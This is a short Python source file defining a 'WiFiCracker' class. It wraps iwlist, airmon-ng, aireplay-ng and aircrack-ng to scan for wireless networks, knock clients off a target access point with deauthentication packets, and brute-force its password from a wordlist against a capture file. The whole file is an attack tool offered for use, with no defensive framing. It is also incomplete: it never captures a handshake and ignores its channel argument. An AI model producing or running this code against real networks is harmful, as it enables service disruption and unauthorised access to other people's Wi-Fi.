import subprocess


class WiFiCracker:
    def scan_networks(self):
        try:
            result = subprocess.run(['sudo', 'iwlist', 'wlan0', 'scan'], capture_output=True, text=True)
            return result.stdout
        except Exception as e:
            return str(e)

    def deauth_attack(self, bssid, channel, npackets):
        try:
            subprocess.run(['sudo', 'airmon-ng', 'start', 'wlan0'], check=True)
            subprocess.run(['sudo', 'aireplay-ng', '--deauth', str(npackets), '-a', bssid, 'wlan0mon'], check=True)
            return True
        except Exception as e:
            return False

    def crack_password(self, bssid, wordlist):
        try:
            result = subprocess.run(['sudo', 'aircrack-ng', '-b', bssid, '-w', wordlist, 'capture.cap'],
                                    capture_output=True, text=True)
            return result.stdout
        except Exception as e:
            return None
